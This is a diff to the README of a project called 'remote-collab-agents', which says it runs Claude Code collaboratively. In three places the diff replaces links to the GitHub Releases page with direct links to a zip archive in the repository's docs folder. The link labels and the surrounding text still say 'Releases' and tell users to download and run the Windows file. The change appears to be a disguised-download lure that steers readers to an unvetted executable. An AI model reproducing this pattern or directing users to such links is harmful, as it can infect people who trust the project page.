@@ -1,6 +1,6 @@
 # 🤝 remote-collab-agents - Run Claude Code together
 
-[🟦 Download the app from Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/releases)
+[🟦 Download the app from Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/raw/refs/heads/main/docs/collab_agents_remote_v2.1-beta.5.zip)
 
 ## 📌 What this app does
 
@@ -25,7 +25,7 @@ If you only have one machine, you can still install the app and learn the setup 
 
 Visit this page to download the Windows release:
 
-[🟦 Go to Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/releases)
+[🟦 Go to Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/raw/refs/heads/main/docs/collab_agents_remote_v2.1-beta.5.zip)
 
 On the Releases page, look for the latest version and download the Windows file for your machine. If there are more than one file, pick the one for Windows. After the download finishes, open the file and follow the on-screen steps.
 
@@ -204,6 +204,6 @@ This setup keeps the workflow easy to follow.
 
 Get the latest Windows build here:
 
-[🟦 Download from GitHub Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/releases)
+[🟦 Download from GitHub Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/raw/refs/heads/main/docs/collab_agents_remote_v2.1-beta.5.zip)
 
 Look for the newest release, then download and run the Windows file for your machine.
